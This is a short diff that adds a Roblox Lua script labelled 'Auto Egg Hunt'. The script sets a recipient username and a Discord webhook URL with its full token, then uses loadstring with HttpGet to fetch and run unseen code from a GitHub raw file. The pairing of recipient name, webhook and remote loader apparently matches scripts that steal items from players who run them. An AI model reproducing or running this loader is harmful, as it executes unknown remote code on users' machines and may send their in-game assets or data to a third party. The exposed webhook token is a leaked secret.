@@ -1,0 +1,7 @@
+_G.Username = "wee911wee"
+
+_G.HubName = "Auto Egg Hunt"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095549650813063179/Sg7tFkFGUBn4RF8OcV7PoqEkm5lvVy_SG9zzx_cNBmQP3ENxPuZOf3a0YWX7D1er2rla"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
